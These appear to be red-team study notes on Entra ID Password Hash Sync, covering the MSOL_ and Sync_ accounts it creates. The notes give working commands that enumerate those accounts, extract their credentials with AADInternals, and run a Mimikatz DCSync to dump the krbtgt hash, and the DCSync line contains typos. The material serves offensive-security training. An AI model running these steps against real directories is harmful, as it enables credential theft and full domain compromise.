# Password Hash Sync(PHS) 
- it syncs users and a hash of their password hashes (not clear-text or original hashes) from on-prem to Entra ID
- the simplest and most popular method for getting a hybrid identity
- PHS is required for features like Identity Protection and AAD Domain Services
- Hash synchronization takes place every 2 minutes
- When a user tries to access any Azure resource, the authentication takes place on Entra ID
- built-in security groups are not synced
- by default, password expiry and account expiry are not reflected in Entra ID. That means a user whose on-prem password is expired can continue to access Azure resources using the old password

![[Pasted image 20241123055540.png]]

## PHS - Abuse
When PHS is configured:
- An Account with name `MSOL_<installationID>` is automatically created in on-prem AD. For example, `MSOL_782bef6aa0a9` this account has replication permissions(DCSync) in the on-prem AD.
- An account `Sync_<name of on-prem ADConnect Server>_installationID` is created in Entra ID. For example, `Sync_DEFENG-ADCNCT_782bef6aa0a9` this account used to have the ability to reset password for any user including the tenant owner, but permissions were removed in August 2024
- Password for both accounts are stored in SQL server on the server where Entra ID Connect is installed and is is possible to extract them in clear-text if you have admin privileges on the server. 


# Lateral Movement
You can Enumerate the server where Entra connect is installed using the following on-prem enumeration (assuming that the server is domain joined - which is the Microsoft recommended method)
- Using the ActiveDirectory module
`Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SanAccountName, Description | fl`

- Or from Enta ID (Below command uses the Azure AD module)
` Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}`

# On-Prem Dominance
Once the Entra connect server is compromised. Use the below commands from the AADInternals module to extract credentials
` Get-AADIntSyncCredentials`

Using the creds of MSOL_* account, we can run DCSync against the on-prem AD
```
runas /netonly /user:defeng.corp\MSOL_782bef6aa09 cmd Invoke-Mimikatz -Command '"lsadump::dcdync /user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```